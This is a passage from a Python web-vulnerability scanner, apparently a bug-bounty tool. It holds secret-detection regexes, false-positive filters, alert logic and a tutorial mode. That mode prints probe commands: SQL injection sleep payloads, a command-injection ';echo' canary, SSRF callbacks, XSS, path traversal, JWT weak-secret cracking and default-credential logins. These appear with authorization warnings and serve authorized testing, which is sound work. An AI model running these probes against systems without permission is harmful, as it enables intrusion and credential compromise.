    (r'ghp_[A-Za-z0-9]{36}', "github_token"),
    (r'sk-[A-Za-z0-9]{48}', "openai_key"),
    (r'sk\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+', "mapbox_secret_token"),
    (r'pk\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+', "mapbox_public_token"),
]

JS_STAGING_PATTERNS = [
    r"""[\"'`](https?://(?:dev|staging|stage|uat|test|qa|internal|corp|beta|alpha)\.[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}[^\s\"'`<>]{0,100})""",
    r"""[\"'`](https?://[a-zA-Z0-9._-]+\.(?:internal|local|corp|dev|staging)[^\s\"'`<>]{0,100})""",
]

# False positive filters for secrets
SECRET_FP_PATTERNS = [
    "example", "placeholder", "your_", "YOUR_", "xxx", "test", "dummy",
    "xxxxxxxx", "00000000", "11111111", "abcdefgh", "REPLACE", "changeme",
    "insert", "INSERT", "fake", "mock",
    # UI string keys — kebab/snake-case identifiers from i18n and component systems
    "invalid-", "input-", "error-", "label-", "button-", "create-",
    "edit-", "update-", "delete-", "set-new-", "confirm-", "reset-",
    "forgot-", "enter-", "account-", "validation", "-password", "-token",
    "-create", "-update", "-error", "-invalid", "-required", "-verify",
    "-gauth", "-one-time", "new-password", "old-password", "current-password",
]

def is_secret_fp(val):
    return any(fp in val.lower() for fp in SECRET_FP_PATTERNS)

# Known public/client-side key prefixes — intentionally shipped in
# frontend code and carry no server-side privilege
PUBLIC_KEY_PREFIXES = [
    "AIza",       # Google public API keys (Maps, YouTube, etc.)
    "pk_live_",   # Stripe publishable live key
    "pk_test_",   # Stripe publishable test key
    "G-",         # Google Analytics GA4 measurement ID
    "UA-",        # Google Analytics Universal Analytics
    "GTM-",       # Google Tag Manager
    "ca-pub-",    # Google AdSense
    "APA91",      # Firebase Cloud Messaging sender ID
    "1:",         # Firebase project number prefix
]

# Mapbox public tokens (pk.eyJ…) are intentionally shipped in frontend code.
# Only sk.eyJ… are secret tokens.
_mapbox_pk_seen: set = set()

def is_public_key(val):
    """Return True if the value matches a known public/client-side key format."""
    if val.startswith("pk.eyJ"):
        return True  # Mapbox public token — intentionally client-side
    return any(val.startswith(p) for p in PUBLIC_KEY_PREFIXES)

def is_identifier_string(val):
    """
    Return True if the value looks like a code identifier rather than
    a real credential. Real passwords have mixed chars, symbols, entropy.
    Identifiers are snake_case, SCREAMING_SNAKE, camelCase, or PascalCase
    containing only word characters.
    """
    # URL path — starts with / and contains no spaces or special credential chars
    if val.startswith('/'):
        return True
    # Pure word characters + underscores = almost certainly an identifier
    if re.fullmatch(r'[A-Za-z0-9_]+', val):
        return True
    # Double underscores = namespaced i18n key (e.g. login__incorrect_password)
    if '__' in val:
        return True
    # UUID — consent management IDs, tracking IDs, etc.
    if re.fullmatch(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', val.lower()):
        return True
    # HTML attribute selector — e.g. [type=password], [name=passwd]
    if val.startswith('[') and val.endswith(']'):
        return True
    # JS expression fragment — contains operators or function calls
    if re.search(r'[+\(\)\[\]{}]', val):
        return True
    # No digits and no common password complexity chars → human-readable label,
    # not a credential. Catches i18n/l10n strings like "Contraseña", "Mot de passe",
    # garbled encodings thereof, error messages, and UI copy embedded in password
    # fields (e.g. password:"Usuario o contraseña inválidos").
    if not re.search(r'[\d!@#$%^&*+=]', val):
        return True
    return False


# ─────────────────────────────────────────────
# Fingerprint-based false-positive suppression
# ─────────────────────────────────────────────
#
# Each category maps to a list of patterns.  Each pattern is either:
#   str           — substring that must appear in the response body OR the
#                   alert detail string (case-insensitive).
#   tuple[str,..] — ALL substrings must appear in the response body
#                   (compound match; body-only, not checked in detail).
#
# Tracking-param patterns are checked against the target URL and detail
# string rather than the response body (they appear in query strings).

FINGERPRINT_LIBRARY: dict = {

    "cdn_errors": [
        "Cloudflare Ray ID",                            # Cloudflare block page
        ("Reference #", "Error"),                       # Akamai error page
        "_Incapsula_Resource",                          # Incapsula / Imperva WAF
        ("Attention Required!", "Cloudflare"),          # Cloudflare JS challenge
        ("Access Denied", "Request ID"),                # AWS WAF block
        ("This page can't be found", "IIS"),            # IIS default 404
        "edgesuite.net",                                # Akamai edge error
        "x-amzn-requestid",                             # AWS WAF / API Gateway header in body
    ],

    "cms_defaults": [
        "If you can read this, WordPress is installed",
        "Congratulations on your new WordPress site",
        "Welcome to Laravel",
        "Whitelabel Error Page",                        # Spring Boot default error
        ("It worked!", "Apache"),                       # Apache httpd default page
        "Welcome to nginx!",                            # nginx default page
        "IIS Windows Server",                           # IIS default page
        ("Hello world!", "WordPress"),                  # WordPress default post
        "This is a default index page",
    ],

    "tracking_params": [
        # URL parameter names — checked against target URL and detail,
        # not the response body.
        "msockid=", "msclkid=",                         # Microsoft
        "fbclid=",                                      # Facebook / Meta
        "gclid=", "dclid=",                             # Google
        "twclid=",                                      # Twitter / X
        "ttclid=",                                      # TikTok
        "li_fat_id=",                                   # LinkedIn
        "mc_eid=",                                      # Mailchimp
        "utm_source=", "utm_medium=", "utm_campaign=",  # UTM
        "_ga=", "_gid=",                                # Google Analytics
    ],

    "asset_hashes": [
        # Patterns that mark a string as a content-addressable asset hash.
        # Checked against the alert detail (which typically includes a snippet).
        ".min.js", ".min.css", ".bundle.js", ".chunk.js",
        "integrity=\"sha",                              # SRI hash attribute
        "integrity='sha",
    ],

    "framework_defaults": [
        "Laravel Telescope",
        "Django administration",                        # Django admin login default
        ("Spring Boot", "Actuator"),                    # Spring Boot actuator UI
        "Rails Info",                                   # rails/info page
        "Ruby on Rails: Welcome aboard",
        "Yii Framework",
        "Symfony Exception",                            # Symfony debug exception page
    ],

    "known_benign_strings": [
        # jwt.io demo token (header segment is always identical)
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
        ".eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ",
        # Common JWT placeholder secrets
        "your-256-bit-secret",
        "your-secret-key",
        # Lorem ipsum — template / default content
        "Lorem ipsum dolor sit amet",
        # Placeholder API key strings in documentation
        "YOUR_API_KEY",
        "INSERT_KEY_HERE",
        "YOUR_SECRET_KEY",
        "REPLACE_WITH_YOUR_KEY",
        "API_KEY_HERE",
        "<YOUR_API_KEY>",
        "{YOUR_API_KEY}",
    ],
}


def _fp_log(finding_type: str, target: str, category: str, pattern: str) -> None:
    """Print a DEBUG-level suppression notice."""
    print(timestamp() + f" [FP Suppressed] {finding_type} on {target[:60]} "
          f"matched fingerprint: {category}/{pattern[:50]}")


def is_false_positive(
    finding_type: str,
    response_text: str,
    target_url: str,
    detail: str,
) -> tuple:
    """
    Check a proposed finding against FINGERPRINT_LIBRARY.

    Returns (True, category_name) if the finding should be suppressed,
    or (False, None) if it should be fired normally.

    Matching rules:
      - str patterns in 'tracking_params': checked against target_url + detail
        (tracking params appear in URLs, not response bodies).
      - str patterns in other categories: checked against response_text AND
        detail (case-insensitive substring match).
      - tuple patterns: ALL substrings must appear in response_text
        (body-only compound match).
    """
    body  = (response_text or "").lower()
    det   = (detail or "").lower()
    url   = (target_url or "").lower()

    for category, patterns in FINGERPRINT_LIBRARY.items():
        for pattern in patterns:
            if isinstance(pattern, tuple):
                # Compound body-only match
                if body and all(p.lower() in body for p in pattern):
                    _fp_log(finding_type, target_url, category,
                            " + ".join(str(p) for p in pattern))
                    return True, category
            else:
                needle = pattern.lower()
                if category == "tracking_params":
                    # URL / detail check only — avoid suppressing body-based findings
                    if needle in url or needle in det:
                        _fp_log(finding_type, target_url, category, pattern)
                        return True, category
                else:
                    if needle in body or needle in det:
                        _fp_log(finding_type, target_url, category, pattern)
                        return True, category

    return False, None


def _load_user_fp_suppressions(path: str = "fp_suppressions.json") -> None:
    """
    Extend FINGERPRINT_LIBRARY with user-defined patterns from a JSON file.

    The file must be a JSON object whose keys are category names and whose
    values are lists of patterns.  Each pattern is either a string (single
    match) or an array of strings (compound — all must be present in the
    response body).  Unknown categories are added as new entries.

    Example fp_suppressions.json:
        {
            "cdn_errors": ["My CDN error fingerprint"],
            "my_custom": [["must have this", "and this"]]
        }

    Called once at module load; silently skips missing or malformed files.
    """
    if not os.path.isfile(path):
        return
    try:
        with open(path, encoding="utf-8") as f:
            data = json.load(f)
        if not isinstance(data, dict):
            return
        for category, patterns in data.items():
            if not isinstance(patterns, list):
                continue
            converted = []
            for p in patterns:
                if isinstance(p, str):
                    converted.append(p)
                elif isinstance(p, list) and all(isinstance(s, str) for s in p):
                    converted.append(tuple(p))   # inner list → compound tuple
            if category in FINGERPRINT_LIBRARY:
                FINGERPRINT_LIBRARY[category].extend(converted)
            else:
                FINGERPRINT_LIBRARY[category] = converted
        print(timestamp() + f" [FP] Loaded user suppressions from {path} "
              f"({sum(len(v) for v in data.values() if isinstance(v, list))} patterns)")
    except Exception as exc:
        print(timestamp() + f" [FP] Could not load {path}: {exc}")


# Load user suppressions once at module initialisation
_load_user_fp_suppressions()


# ─────────────────────────────────────────────
# Alert system — exploitable vulnerability detection
# ─────────────────────────────────────────────

HIGH_SEVERITY_TYPES = {
    "aws_access_key", "github_token", "openai_key",
    "api_key", "secret", "token", "password",
    "private_key", "client_secret",
}

# Ports that, if open to the internet, represent direct exploitation risk
CRITICAL_PORTS = {
    5432:  "PostgreSQL",
    6379:  "Redis (unauthenticated by default)",
    27017: "MongoDB (unauthenticated by default)",
    23:    "Telnet (unencrypted)",
}

# Ports that are common and not inherently dangerous — logged but not alerted
INFORMATIONAL_PORTS = {
    21:   "FTP",
    22:   "SSH",
    3306: "MySQL",
}

# Tracks FQDNs already alerted to prevent duplicate alerts from the
# wordlist prober and the CT log path discovering the same subdomain.
_alerted_subdomains: set = set()

def _alert_high_value_subdomain(fqdn, label, ip, status, source=""):
    """
    Fire a HIGH-VALUE SUBDOMAIN EXPOSED alert, but only once per FQDN.
    Performs the secondary content fetch to confirm a real service is
    listening before alerting. Suppresses if the body is under 100 chars
    or the connection times out.
    """
    if fqdn in _alerted_subdomains:
        return
    scheme = "https://" if (status and status < 400) else "http://"
    source_note = f" (discovered via {source})" if source else ""
    try:
        content_resp = _get_session().get(
            scheme + fqdn,
            headers=create_request_header(),
            timeout=6,
            allow_redirects=True,
            verify=False,
        )
        if len(content_resp.text) < 100:
            print(timestamp() + f" {fqdn} body too short ({len(content_resp.text)} chars) — suppressing high-value subdomain alert")
            return
    except requests.exceptions.Timeout:
        print(timestamp() + f" {fqdn} timed out on content fetch — suppressing high-value subdomain alert (DNS resolves, no service confirmed)")
        return
    except Exception:
        pass  # network error — alert conservatively

    _alerted_subdomains.add(fqdn)
    alert(
        f"HIGH-VALUE SUBDOMAIN EXPOSED: {label}",
        "HIGH",
        fqdn,
        f"{fqdn} resolves to {ip} and returns HTTP {status}{source_note}"
    )

# Subdomains that are high-value targets when exposed
HIGH_VALUE_SUBDOMAINS = {
    "admin", "administrator", "portal", "dashboard", "cpanel", "whm",
    "jenkins", "ci", "build", "deploy", "gitlab", "bitbucket",
    "jira", "confluence", "staging", "stage", "dev", "uat",
    "vpn", "remote", "rdp", "ssh", "db", "database", "redis", "mongo",
    "internal", "corp", "backup",
}

# EOL PHP major versions — known vulnerable
EOL_PHP_VERSIONS = {"5", "4", "3"}

# Social media domains to skip when --no-social is active.
# Add entries here to extend the list.
SOCIAL_MEDIA_DOMAINS = {
    # Meta
    "facebook.com", "fb.com", "instagram.com", "threads.net", "messenger.com",
    # Google
    "youtube.com", "youtu.be",
    # Twitter / X
    "twitter.com", "x.com", "t.co",
    # Microsoft
    "linkedin.com", "lnkd.in",
    # TikTok
    "tiktok.com", "vm.tiktok.com",
    # Snapchat
    "snapchat.com",
    # Pinterest
    "pinterest.com", "pin.it",
    # Reddit
    "reddit.com", "redd.it",
    # Tumblr
    "tumblr.com",
    # Discord
    "discord.com", "discord.gg", "discordapp.com",
    # Telegram
    "telegram.org", "t.me",
    # WhatsApp
    "whatsapp.com", "wa.me",
    # Mastodon
    "mastodon.social",
    # Misc
    "vk.com", "weibo.com", "twitch.tv", "bsky.app",
}

# Mutable flag set by --no-social at runtime
SOCIAL_FILTER_FLAGS = {"enabled": False}

# Google tracking / Play Store / CDN domains — skipped by default, disable with --no-skip-google-tracking
SKIP_GOOGLE_TRACKING = True
_GOOGLE_TRACKING_DOMAINS = {
    "play.google.com",
    "google-analytics.com",
    "analytics.google.com",
    "googletagmanager.com",
    "googleadservices.com",
    "doubleclick.net",
    # Maps
    "maps.google.com",
    "maps.googleapis.com",
    # Fonts CDN
    "fonts.googleapis.com",
    "fonts.gstatic.com",
}

def is_google_tracking_url(url):
    """Return True if the URL is a Google tracking, Play Store, Maps, or Fonts CDN domain."""
    try:
        netloc = urlparse(url).netloc.lower()
        if netloc.startswith("www."):
            netloc = netloc[4:]
        for blocked in _GOOGLE_TRACKING_DOMAINS:
            if netloc == blocked or netloc.endswith("." + blocked):
                return True
    except Exception:
        pass
    return False

def is_social_media_domain(url):
    """Return True if the URL belongs to a known social media domain."""
    try:
        netloc = urlparse(url).netloc.lower()
        if netloc.startswith("www."):
            netloc = netloc[4:]
        for blocked in SOCIAL_MEDIA_DOMAINS:
            if netloc == blocked or netloc.endswith("." + blocked):
                return True
    except Exception:
        pass
    return False

_CONFIDENCE_CONFIRMED = "CONFIRMED"
_CONFIDENCE_LIKELY    = "LIKELY"
_CONFIDENCE_NEEDS_VER = "NEEDS VERIFICATION"

# Keywords in alert_type (upper-cased) that map to each confidence level.
# Checked in order: CONFIRMED first, then LIKELY; anything else → NEEDS VERIFICATION.
_CONF_CONFIRMED_KEYS = {
    # Credential checks with body verification
    "DEFAULT CREDENTIALS",
    # Specific file/secret exposure confirmed by body content
    "OPEN REDIRECT",
    "CRLF INJECTION",
    "PATH TRAVERSAL",
    "SSTI",
    "XXE INJECTION CONFIRMED",
    "SERVER-SIDE PROTOTYPE POLLUTION",
    "PROTOTYPE POLLUTION VIA URL",
    "SPRING BOOT ACTUATOR",
    "EXPOSED SECRET",
    "LARAVEL ENV FILE",
    "LARAVEL LOG FILE",
    "LARAVEL DEBUG MODE",
    "LARAVEL TELESCOPE",
    "LARAVEL HORIZON",
    "DJANGO DEBUG MODE",
    "RAILS INFO PROPERTIES",
    "DRUPAL SETTINGS FILE",
    "JOOMLA CONFIGURATION BACKUP",
    "WORDPRESS DEBUG LOG",
    "WORDPRESS USER ENUMERATION",
    "WORDPRESS XMLRPC",
    "WSDL SERVICE DEFINITION",
    "WEBSOCKET UNAUTHENTICATED DATA",
    "WEBSOCKET ORIGIN VALIDATION",
    "WEBSOCKET UNENCRYPTED",
    # Injection findings confirmed by canary/error-string evidence
    "COMMAND INJECTION",
    "SQL INJECTION",
    "LDAP INJECTION",
    # Factual observations (header presence/absence is deterministic)
    "SECURITY HEADER",
    "MISSING SECURITY HEADER",
    "INSECURE COOKIE",
    "JWT",
    # .git/.env body-confirmed exposure
    "GIT EXPOSURE",
    "ENV FILE EXPOSED",
    "SENSITIVE FILE",
}

_CONF_LIKELY_KEYS = {
    "SUBDOMAIN TAKEOVER",
    "PROTOTYPE POLLUTION — POSSIBLE",
    "HTTP REQUEST SMUGGLING",
    "GRAPHQL INTROSPECTION",
    "CORS MISCONFIGURATION",
    "MASS ASSIGNMENT",
    "DANGEROUS HTTP METHOD",
    "WORDPRESS LOGIN PAGE",
    "DJANGO ADMIN PANEL",
    "DRUPAL ADMIN",
    "JOOMLA ADMIN",
    "RAILS MAILERS",
    "API VERSION",
    "OLDER API VERSION",
    "ZONE TRANSFER",
    "DMARC",
    "SPF",
    "DKIM",
    "ACTUATOR SHUTDOWN",
    "SPRING BOOT WHITELABEL",
}


def _infer_confidence(alert_type: str) -> str:
    """
    Derive a confidence level from the alert type string.
    Returns one of CONFIRMED / LIKELY / NEEDS VERIFICATION.
    """
    at = alert_type.upper()
    for key in _CONF_CONFIRMED_KEYS:
        if key in at:
            return _CONFIDENCE_CONFIRMED
    for key in _CONF_LIKELY_KEYS:
        if key in at:
            return _CONFIDENCE_LIKELY
    return _CONFIDENCE_NEEDS_VER


def write_to_alerts_database(alert_type, severity, target, detail, confidence=""):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        conn.execute("""CREATE TABLE IF NOT EXISTS Alerts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            alert_type TEXT,
            severity TEXT,
            target TEXT,
            detail TEXT,
            confidence TEXT,
            found_at TEXT
        )""")
        # Migrate existing databases that pre-date the confidence column
        try:
            conn.execute("ALTER TABLE Alerts ADD COLUMN confidence TEXT")
        except Exception:
            pass  # column already exists
        # Deduplicate — don't re-insert the same finding
        existing = conn.execute(
            "SELECT id FROM Alerts WHERE alert_type=? AND target=? AND detail=? LIMIT 1",
            (alert_type, target, detail)).fetchone()
        if not existing:
            conn.execute(
                "INSERT INTO Alerts (alert_type,severity,target,detail,confidence,found_at) "
                "VALUES (?,?,?,?,?,?)",
                (alert_type, severity, target, detail, confidence, timestamp()))
    except Exception as e:
        print_error("write_to_alerts_database: " + str(e))
    finally:
        conn.close()

# ── Tutorial mode — per-type verification guidance ────────────────────────────

_TUTORIAL_AUTH_NOTE = (
    "⚠ Only test on authorized targets covered by a bug bounty program "
    "or with explicit written permission."
)


def _tutorial_note(alert_type: str) -> str:
    """
    Return a HOW TO VERIFY block for tutorial mode, or empty string if the
    alert type has no specific guidance.  Appended to the stored detail field;
    displayed as a collapsible section in the Flask UI.
    """
    atype = alert_type.lower()

    if "sql inject" in atype:
        guidance = (
            "1. Reproduce manually:\n"
            "   curl -s \"https://target.com/page?param=test'\" | grep -i 'sql\\|syntax\\|error'\n"
            "2. Confirm with a safe time-based check:\n"
            "   curl -s -o /dev/null -w '%{time_total}' \\\n"
            "     \"https://target.com/page?param=1+AND+SLEEP(2)--\"\n"
            "   If response time is ~2s longer than baseline,\n"
            "   time-based blind SQLi is likely confirmed.\n"
            "Do NOT extract data — confirming the error or delay is sufficient for reporting."
        )
    elif "command inject" in atype or "cmdi" in atype:
        guidance = (
            "1. Test if canary appears as plain text output:\n"
            "   curl -s 'https://target.com/page?param=test%3Becho%20verify-123'\n"
            "   Look for 'verify-123' as unencoded plain text\n"
            "   in response body, NOT inside a URL or attribute.\n"
            "2. If plain text output confirmed, document with:\n"
            "   curl -v 'https://target.com/page?param=test%3Becho%20verify-123' 2>&1\n"
            "Do NOT run destructive commands — echo output confirmation is sufficient."
        )
    elif "ssrf" in atype:
        guidance = (
            "1. Register an interact.sh session:\n"
            "   curl -s -X POST https://oast.pro/api/v1/register\n"
            "   Note the correlation-id and subdomain returned.\n"
            "2. Send the SSRF payload:\n"
            "   curl -s 'https://target.com/page?url=http://YOUR-ID.interact.sh'\n"
            "3. Poll for interactions:\n"
            "   curl -s 'https://oast.pro/api/v1/poll?id=YOUR-ID&secret=YOUR-SECRET'\n"
            "DNS or HTTP interaction from target IP = confirmed SSRF."
        )
    elif "idor" in atype:
        guidance = (
            "1. Set up two test accounts — Account A and Account B.\n"
            "2. Find a resource owned by Account B:\n"
            "   curl -s 'https://target.com/api/resource/ACCOUNT-B-ID' \\\n"
            "     -H 'Authorization: Bearer ACCOUNT-A-TOKEN'\n"
            "3. If Account B's data is returned using Account A's token,\n"
            "   IDOR is confirmed.\n"
            "Never access real user data — use test accounts only."
        )
    elif "takeover" in atype:
        guidance = (
            "1. Confirm the CNAME is dangling:\n"
            "   dig CNAME vulnerable.target.com\n"
            "2. Confirm the target returns an unclaimed fingerprint:\n"
            "   curl -s 'https://vulnerable-target.github.io' | grep -i '404\\|not found'\n"
            "3. Confirm the GitHub org does not exist:\n"
            "   curl -s -o /dev/null -w '%{http_code}' \\\n"
            "     'https://github.com/orgname'\n"
            "   404 = org does not exist = claimable namespace.\n"
            "Do NOT claim the resource — document and report only."
        )
    elif "xss" in atype:
        guidance = (
            "1. Confirm reflection in response:\n"
            "   curl -s 'https://target.com/page?param=<script>alert(1)</script>' \\\n"
            "     | grep -i 'script'\n"
            "2. Confirm execution in browser:\n"
            "   Open the URL in a browser and verify alert fires.\n"
            "3. Document with a screenshot of the alert dialog.\n"
            "Use alert(1) only — do not steal cookies or exfiltrate data."
        )
    elif "open redirect" in atype:
        guidance = (
            "1. Check the Location header:\n"
            "   curl -s -o /dev/null -w '%{redirect_url}' \\\n"
            "     'https://target.com/redirect?url=https://example.com'\n"
            "   If Location contains example.com, redirect confirmed.\n"
            "2. Demonstrate additional impact for higher severity —\n"
            "   show the redirect can be used for phishing by\n"
            "   crafting a realistic URL."
        )
    elif "jwt" in atype:
        guidance = (
            "python3 -c \"\n"
            "import jwt, sys\n"
            "token = 'PASTE_TOKEN_HERE'\n"
            "for secret in ['secret','password','123456','your-256-bit-secret']:\n"
            "    try:\n"
            "        decoded = jwt.decode(token, secret, algorithms=['HS256'])\n"
            "        print(f'Cracked with secret: {secret}')\n"
            "        print(decoded)\n"
            "        sys.exit(0)\n"
            "    except: pass\n"
            "print('Not cracked with common secrets')\n"
            "\"\n"
            "Do NOT forge tokens to access other accounts."
        )
    elif "default credential" in atype:
        guidance = (
            "1. Confirm service is genuine with body verification:\n"
            "   curl -s 'https://target.com/admin' | grep -i \\\n"
            "     'select database\\|adminer\\|logout\\|dashboard'\n"
            "2. Attempt login with default credentials:\n"
            "   curl -s -X POST 'https://target.com/admin' \\\n"
            "     -d 'username=admin&password=admin' | grep -i \\\n"
            "     'logout\\|welcome\\|dashboard'\n"
            "   Presence of authenticated content confirms access.\n"
            "Document immediately and do not exercise any\n"
            "functionality beyond confirming login."
        )
    elif "mass assignment" in atype:
        guidance = (
            "1. Send request with injected field:\n"
            "   curl -s -X POST 'https://target.com/api/profile' \\\n"
            "     -H 'Content-Type: application/json' \\\n"
            "     -H 'Authorization: Bearer YOUR-TOKEN' \\\n"
            "     -d '{\"name\":\"test\",\"role\":\"test-role-probe\"}'\n"
            "2. Fetch the resource to confirm persistence:\n"
            "   curl -s 'https://target.com/api/profile' \\\n"
            "     -H 'Authorization: Bearer YOUR-TOKEN' | grep 'role'\n"
            "   If test-role-probe appears in GET response,\n"
            "   field was persisted — confirmed mass assignment.\n"
            "Use false/none values only, never admin:true."
        )
    elif "path traversal" in atype:
        guidance = (
            "1. Test with a safe non-sensitive file:\n"
            "   curl -s 'https://target.com/page?file=../../../etc/hostname'\n"
            "   /etc/hostname contains only the server hostname —\n"
            "   safe to read, confirms traversal without exposing\n"
            "   sensitive data.\n"
            "2. Confirm the response contains a hostname string\n"
            "   rather than an error or the original page.\n"
            "Do NOT read /etc/passwd, private keys, or credentials."
        )
    elif any(k in atype for k in (
        "missing hsts", "missing csp", "missing x-frame",
        "missing x-content", "missing referrer", "missing permissions",
        "security header",
    )):
        guidance = (
            "   curl -sI 'https://target.com' | grep -i \\\n"
            "     'strict-transport\\|x-frame\\|x-content-type\\|content-security'\n"
            "   Missing headers will not appear in output.\n"
            "Combine with a demonstration of impact for\n"
            "higher severity — missing headers alone are\n"
            "typically low or informational."
        )
    elif "spf" in atype or "dmarc" in atype:
        guidance = (
            "1. Check SPF record:\n"
            "   dig TXT target.com | grep 'v=spf'\n"
            "2. Check DMARC record:\n"
            "   dig TXT _dmarc.target.com | grep 'v=DMARC'\n"
            "3. Check DKIM selectors:\n"
            "   dig TXT default._domainkey.target.com\n"
            "   dig TXT google._domainkey.target.com\n"
            "Include raw dig output in your report."
        )
    elif "race condition" in atype:
        guidance = (
            "1. Use Python to send concurrent requests:\n"
            "python3 -c \"\n"
            "import threading, requests, time\n"
            "url = 'https://target.com/api/endpoint'\n"
            "headers = {'Authorization': 'Bearer YOUR-TOKEN'}\n"
            "results = []\n"
            "def send():\n"
            "    r = requests.post(url, headers=headers)\n"
            "    results.append((r.status_code, r.text[:100]))\n"
            "threads = [threading.Thread(target=send) for _ in range(10)]\n"
            "[t.start() for t in threads]\n"
            "[t.join() for t in threads]\n"
            "for r in results: print(r)\n"
            "\"\n"
            "2. Check if multiple requests returned distinct\n"
            "   success responses with different IDs or tokens.\n"
            "Only test on your own account. Do not complete\n"
            "purchases or redeem coupons."
        )
    else:
        return ""

    return f"\n\nHOW TO VERIFY: {_TUTORIAL_AUTH_NOTE}\n\n{guidance}"


def alert(alert_type, severity, target, detail, redact_detail=False, response_body=None):
    """
    Print a high-visibility alert and persist it to the Alerts table.
    severity: CRITICAL | HIGH | MEDIUM
    redact_detail: if True, show only first 6 chars of detail in console output.
    response_body: optional raw response text — passed to is_false_positive()
                   for body-based fingerprint suppression.
    """
    suppressed, fp_category = is_false_positive(alert_type, response_body or "", target, detail)
    if suppressed:
        return

    confidence = _infer_confidence(alert_type)
    display    = (detail[:6] + "*" * max(0, len(detail) - 6)) if redact_detail and len(detail) > 6 else detail
    bar        = _c("=" * 64, Fore.RED, Style.BRIGHT if severity in ("CRITICAL", "HIGH") else "")
    sev_label  = _sev_color(severity)
    conf_label = _c(confidence, Fore.GREEN if confidence == _CONFIDENCE_CONFIRMED
                    else Fore.YELLOW if confidence == _CONFIDENCE_LIKELY
                    else Fore.CYAN)
    print(f"\n{bar}")
    print(f"  {_c('!!', Fore.RED, Style.BRIGHT)} {sev_label} ALERT: {alert_type} {_c('!!', Fore.RED, Style.BRIGHT)}")
    print(f"  Target     : {target}")
    print(f"  Detail     : {display}")
    print(f"  Confidence : {conf_label}")
    print(f"  Time       : {timestamp()}")
    print(f"{bar}\n")
    # Append verification guidance to the stored detail (not the console display)
    if TUTORIAL_MODE:
        note = _tutorial_note(alert_type)
        if note:
            detail = detail + note
    write_to_alerts_database(alert_type, severity, target, detail, confidence)

def write_to_js_database(page_url, js_url, finding_type, value, context=""):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "JSFindings")
        # Migrate existing databases that pre-date the context column
        try:
            conn.execute("ALTER TABLE JSFindings ADD COLUMN context TEXT")
        except Exception:
            pass  # Column already exists
        existing = conn.execute(
            "SELECT url FROM JSFindings WHERE js_url=? AND value=? LIMIT 1",
            (js_url, value)).fetchone()
        if not existing:
            conn.execute(
                "INSERT INTO JSFindings (url,js_url,finding_type,value,context,found_at) VALUES (?,?,?,?,?,?)",
                (page_url, js_url, finding_type, value, context, timestamp()))
    except Exception as e:
        print_error("write_to_js_database: " + str(e))
    finally:
        conn.close()

def _js_context(js_text, value, window=100):
    """
    Return up to window characters before and after the first occurrence of
    value in js_text, with whitespace collapsed so minified JS is readable.
    """
    idx = js_text.find(value)
    if idx == -1:
        return ""
    start = max(0, idx - window)
    end   = min(len(js_text), idx + len(value) + window)
    snippet = js_text[start:end]
    return re.sub(r'\s+', ' ', snippet).strip()


def analyse_js_bundle(page_url, js_url):
    """Download and analyse a JS bundle for endpoints, secrets, and staging URLs."""
    if _stop_event.is_set():
        return
    if js_url in _js_analysed:
        return
    _js_analysed.add(js_url)

    try:
        resp = safe_get(js_url, timeout=10)
        if not resp or resp.status_code != 200:
            return
        content_type = resp.headers.get("Content-Type", "")
        if "javascript" not in content_type and "text" not in content_type:
            return

        js_text = resp.text
        if len(js_text) < 100:
            return

        findings = 0

        # Endpoints
        for pattern in JS_ENDPOINT_PATTERNS:
            for match in re.findall(pattern, js_text):
                if len(match) > 5 and match not in ("/", "//") \
                        and not is_endpoint_noise(match):
                    ctx = _js_context(js_text, match)
                    write_to_js_database(page_url, js_url, "endpoint", match, ctx)
                    findings += 1

        # Secrets
        for pattern, secret_type in JS_SECRET_PATTERNS:
            for match in re.findall(pattern, js_text):
                val = match if isinstance(match, str) else match[0]
                if not val:
                    continue
                # Mapbox public token — INFO only, deduplicate across JS files
                if secret_type == "mapbox_public_token":
                    if val not in _mapbox_pk_seen:
                        _mapbox_pk_seen.add(val)
                        ctx = _js_context(js_text, val)
                        write_to_js_database(page_url, js_url, secret_type, val, ctx)
                        alert("MAPBOX PUBLIC TOKEN", "INFO", js_url,
                              "pk.eyJ token is a client-side public key — no server privilege", redact_detail=False)
                    continue
                if is_secret_fp(val) or is_public_key(val) or is_identifier_string(val):
                    continue
                print(timestamp() + " JS SECRET [" + secret_type + "] in " + js_url)
                ctx = _js_context(js_text, val)
                write_to_js_database(page_url, js_url, secret_type, val, ctx)
                findings += 1
                if secret_type in HIGH_SEVERITY_TYPES:
                    severity = "CRITICAL" if secret_type in {"aws_access_key", "github_token", "openai_key", "private_key", "mapbox_secret_token"} else "HIGH"
                    alert(f"EXPOSED SECRET: {secret_type}", severity, js_url, val, redact_detail=True)

        # Staging/internal URLs
        for pattern in JS_STAGING_PATTERNS:
            for match in re.findall(pattern, js_text):
                if match:
                    ctx = _js_context(js_text, match)
                    write_to_js_database(page_url, js_url, "staging_url", match, ctx)
                    findings += 1

        # S3 bucket references
        extract_and_probe_s3_buckets(js_text, js_url)

        # JWT tokens embedded in JS bundles
        scan_for_jwts(js_url, js_text)

        # Source map exposure — check header and .map path
        check_js_source_map(page_url, js_url, resp)

        # JS comment / TODO scanning — first-party JS only, explicit keywords only
        _JS_CDN_PATTERNS = re.compile(
            r'cdnjs\.cloudflare\.com|unpkg\.com|cdn\.jsdelivr\.net|'
            r'node_modules/|/vendor/|/bower_components/',
            re.IGNORECASE
        )
        _JS_COMMENT_REQUIRED = re.compile(
            r'\b(TODO|FIXME|HACK|NOTE)\b'
        )
        if not _JS_CDN_PATTERNS.search(js_url):
            _JS_COMMENT_PATTERNS = [
                re.compile(r'//[^\n]*'),
                re.compile(r'/\*.*?\*/', re.DOTALL),
            ]
            for cpat in _JS_COMMENT_PATTERNS:
                for comment in cpat.findall(js_text):
                    if _JS_COMMENT_REQUIRED.search(comment):
                        clean = " ".join(comment.split())[:200]
